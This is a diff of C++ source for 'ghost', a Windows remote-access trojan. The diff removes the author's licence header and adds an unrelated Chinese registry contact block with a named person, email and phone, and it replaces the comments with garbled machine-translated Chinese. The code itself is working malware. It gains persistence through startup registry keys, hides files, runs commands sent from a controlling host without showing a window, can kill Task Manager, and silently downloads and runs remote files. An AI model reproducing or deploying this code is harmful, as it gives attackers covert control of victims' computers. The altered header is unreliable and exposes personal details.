@@ -1,32 +1,20 @@
 /*
 	@title
 		ghost
-	@author
-		AHXR (https://github.com/AHXR)
-	@copyright
-		2018
-
-	ghost is free software: you can redistribute it and/or modify
-	it under the terms of the GNU General Public License as published by
-	the Free Software Foundation, either version 3 of the License, or
-	(at your option) any later version.
-
-	ghost is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-	GNU General Public License for more details.
-
-	You should have received a copy of the GNU General Public License
-	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
+	人：yanling ruan
+       nic-hdl：YR194-AP
+       电子邮件：sh-ipmaster@chinaunicom.cn
+       地址：上海市浦东大道900号
+       电话：+ 086-021-61201616
+       传真号码：+ 086-021-61201616
+       国家：cn
 */
 //=======================================================
 #define						GHOSTVER						"1.0.3b"
 #define						DEFAULT_BUFF					19056
 #define						TMPLOG							"svchost.log"
-//#define					GHOST_HIDE						/* DEBUG */
-//#define					AHXRLOGGER_PLUGIN				// https://github.com/AHXR/ahxrlogger
 
-// 64-bit automatically redirected to "HKLM\SOFTWARE\Wow6432Node"
+// 64位自动重定向到“HKLM \ SOFTWARE \ Wow6432Node”
 #define						KEY_TARGET						HKEY_LOCAL_MACHINE 
 #define						KEY_NON_ADMIN_TARGET			HKEY_CURRENT_USER
 #define						KEY_STARTUP						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
@@ -75,7 +63,7 @@ void main(cli::array<System::String^>^ args)
 	if (args->Length < 2) // IP and Port;
 		exit(EXIT_FAILURE);
 
-	// String to PCSTR (const char *)
+	// 字符串到PCSTR（const char *）
 	str_host = (const char * ) Marshal::StringToHGlobalAnsi(args[0]).ToPointer();
 	str_port = (const char * ) Marshal::StringToHGlobalAnsi(args[1]).ToPointer();
 
@@ -132,9 +120,9 @@ void main(cli::array<System::String^>^ args)
 	remove(c_temp_cmd); // Remove previous instance.
 
 	/*
-		Attempting to add to the Shell start-up. This is so that the zombie runs in safemode as well.
-		This will also hide this application from CCleaner or any other application that scans for start-up 
-		programs.
+试图加入Shell初创公司。 这就是僵尸在安全模式中运行的原因。
+此应用程序还将从启动时隐藏此应用程序。
+节目。
 	*/
 	HKEY h_key;
 	long l_key;
@@ -154,10 +142,10 @@ void main(cli::array<System::String^>^ args)
 	}
 
 	if (!b_good) {
-		// Adding to start-up since we couldn't use the Shell start-up.
+		//添加到启动，因为我们无法使用Shell启动。
 		l_key = RegOpenKeyEx(KEY_TARGET, KEY_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
 
-		// No admin access. Just make it user startup.
+		//没有管理员权限 只需让用户启动即可。
 		if (l_key == ERROR_ACCESS_DENIED) {
 			l_key = RegOpenKeyEx(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
 			b_admin_access = true;
@@ -174,8 +162,8 @@ void main(cli::array<System::String^>^ args)
 
 	SetFileAttributes((char *)c_path, FILE_ATTRIBUTE_HIDDEN);
 #else
-	GetTempPath(MAX_PATH, str_temp); // Temp path for returning cmd response.
-	GetSystemDirectory(str_windows, MAX_PATH);  // Looking for cmd.exe
+	GetTempPath(MAX_PATH, str_temp); //返回cmd响应的临时路径
+	GetSystemDirectory(str_windows, MAX_PATH);  //寻找cmd.exe
 
 	sprintf(c_temp_cmd, "%s%s", str_temp, TMPLOG);
 	sprintf(c_cmd_dir, "%s\\cmd.exe", str_windows);
@@ -183,7 +171,7 @@ void main(cli::array<System::String^>^ args)
 
 	h_payload = CreateThread(NULL, NULL, &t_payloads, 0, 0, 0);
 
-	// Starting and idling server
+	//启动和空闲服务器
 	while (1) {
 		if( client.init(str_host, str_port, TCP_SERVER, onClientConnect) ) 
 			client.listen(onClientRecData, false);
@@ -191,7 +179,7 @@ void main(cli::array<System::String^>^ args)
 		if (client.Socket_Client != INVALID_SOCKET)
 			closesocket(client.Socket_Client);
 
-		b_cmd = false; // Safe reset
+		b_cmd = false; // 安全重置
 		Sleep(1000);
 	}
 }
@@ -297,7 +285,7 @@ void onClientConnect() {
 
 void onClientRecData( char * data ) {
 
-	// Removing encryption.
+	// R加密加密。
 	if (strcmp(data, "CMD") != 0) {
 		string s_data = data;
 		s_data = unencryptCMD(s_data);
@@ -318,8 +306,8 @@ void onClientRecData( char * data ) {
 	*/
 
 	/*
-		The keyword "ghost_ping" is strictly for the server to determine whether the socket is
-		active or not. Any data that is simply "ghost_ping" will be ignored.
+		关键字“ghost_ping”用于确定套接字是否为
+是否有效。 任何简单地“ghost_ping”的数据都将被忽略。
 	*/
 	if (!strcmp(c_new_data, "ghost_ping"))
 		b_skip = true;
@@ -327,12 +315,12 @@ void onClientRecData( char * data ) {
 	if (!strcmp(c_new_data, "ghost_tskmgr")) {
 		b_taskmgr = !b_taskmgr;
 		client.send_data(encryptCMD(string(b_taskmgr ? "Task Manager Killer Enabled" : "Task Manager Killer Disabled")).c_str());
-		b_skip = true; // Nullifying by using the magical keyword
+		b_skip = true; // 通过使用魔法关键字进行无效
 	}
 
-	// b_skip determines whether the server is doing commands or not.
+	// b_skip法令
 	if ( !b_skip ) {
-		if (!strcmp(c_new_data, "CMD")) // Toggling Command Prompt response 
+		if (!strcmp(c_new_data, "CMD")) // 切换命令提示响应 
 			b_cmd = !b_cmd;
 		else {
 			if (b_cmd) {
@@ -343,9 +331,9 @@ void onClientRecData( char * data ) {
 				sprintf(c_output, "/C %s > %s", c_new_data, c_temp_cmd);
 
 				/*
-					Running the command without a window. Using WinExec, system, or ShellExecute will make
-					a random command prompt pop-up. This will make it obvious that something is going on 
-					in the background, which voids the whole point of "ghost".
+					在没有窗口的情况下运行命令。 使用WinExec，系统或ShellExecute将使
+随机命令提示符弹出窗口。 这将是一件事
+在背景中，这是“幽灵”的重点。
 				*/
 				STARTUPINFO info = { sizeof(info) };
 				PROCESS_INFORMATION processInfo;
@@ -356,12 +344,12 @@ void onClientRecData( char * data ) {
 				}
 
 				/*
-					In c_output, the right carrot symbol writes the output to a file. Here, we are going to 
-					read that file and send the result back to the server. This is so the server knows what 
-					happened with their command.
+					在c_output中，右胡萝卜符号将输出写入文件。 在这里，我们要去
+将此文件读回服务器。 这是服务器知道什么
+他们的命令发生了。
 
-					Certain commands will return no response, which is fine. However, as far as I'm concerned,
-					invalid commands do not write to a file.
+某些命令将不返回任何响应，这很好。 但是，据我所知，
+无效的命令。
 				*/
 				f_response.open(c_temp_cmd, ios::in | ios::binary);
 
@@ -373,7 +361,7 @@ void onClientRecData( char * data ) {
 					char * c_read = new char[i_length];
 					f_response.read(c_read, i_length);
 
-					// Null terminating. Without this, there will be gibberish at the end of the data.
+					// 空终止。 如果没有这个，数据结尾会有一个胡言乱语。
 					c_read[i_length] = '\0';
 					if (c_read[i_length - 1] == '\n')
 						c_read[i_length - 1] = '\0';
@@ -385,14 +373,14 @@ void onClientRecData( char * data ) {
 
 			}
 
-			// "Download & Execute"
+			// “下载并执行”
 			if (!b_cmd && strcmp(c_new_data, "CMD") != 0) {
 				HRSRC			hr_res;
 				DWORD32			dw_res;
 				LPVOID			lp_res;
 				LPVOID			lp_res_lock;
 
-				// Creating the wget file.
+				// 创建wget文件。
 				hr_res = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
 				dw_res = ::SizeofResource(NULL, hr_res);
 				lp_res = LoadResource(NULL, hr_res);
@@ -404,11 +392,11 @@ void onClientRecData( char * data ) {
 
 				SetFileAttributes("wget.exe", FILE_ATTRIBUTE_HIDDEN);
 
-				// Fetching the sent data.
+				// 获取已发送的数据。
 				json j_response = json::parse(c_new_data);
 				sprintf(c_output, "/C wget %s -O %s", j_response["URL"].get<string>().c_str(), j_response["FILE"].get<string>().c_str());
 	
-				// Running wget.exe in the background. Hiding the command prompt as well. Silent downloading.
+				// 在后台运行wget.exe。 也隐藏命令提示符。 无声下载。
 				STARTUPINFO info = { sizeof(info) };
 				PROCESS_INFORMATION processInfo;
 				if (CreateProcess("wget.exe", c_output, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo))
@@ -433,7 +421,7 @@ void onClientRecData( char * data ) {
 
 				client.send_data(encryptCMD(string(c_output)).c_str());
 
-				// Running the downloaded file and removing wget.exe
+				// 运行下载的文件并删除wget.exe
 				ShellExecute(NULL, "open", j_response["FILE"].get<string>().c_str(), 0, 0, 0);
 				remove("wget.exe");
 			}
